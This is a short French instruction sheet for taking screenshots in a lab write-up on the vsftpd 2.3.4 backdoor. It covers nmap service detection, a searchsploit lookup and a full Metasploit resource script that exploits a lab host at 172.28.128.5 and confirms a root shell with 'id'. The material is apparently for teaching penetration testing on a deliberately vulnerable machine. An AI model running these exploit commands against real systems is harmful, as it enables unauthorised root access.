# Captures — vsftpd 2.3.4 Backdoor

Consignes de capture pour `services/vsftpd.html`. Commandes identiques à celles du write-up
source : `ms2/jules/vsftpd.md`.

## 01-recon-nmap.png

Commande :
```bash
nmap -sV -p 21 172.28.128.5
```

Encadrer en rouge : la ligne `21/tcp open ftp vsftpd 2.3.4` — c'est le footprint qui
déclenche toute la démarche, doit être immédiatement visible.

## 02-searchsploit.png

Commande :
```bash
searchsploit vsftpd 2.3.4
```

Encadrer en rouge : aucun — les deux lignes de résultat sont déjà courtes et lisibles en
entier.

## 03-exploit-msfconsole.png

Commande :
```bash
cat > /tmp/vsftpd.rc << 'EOF'
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 172.28.128.5
set RPORT 21
set LHOST 172.28.128.1
exploit -z
sessions -l
sessions -i 1 -c id
sessions -K
exit -y
EOF
msfconsole -q -r /tmp/vsftpd.rc
```

Encadrer en rouge : la ligne `[*] Meterpreter session 1 opened (...)` — capturer tout le
scroll de sortie, mais cette ligne précise est la preuve que l'exploit a fonctionné.

## 04-session-root.png

Commande (sortie de la fin du script ci-dessus) :
```
sessions -i 1 -c id
```

Encadrer en rouge : `uid=0(root) gid=0(root)` — la preuve finale d'accès root.
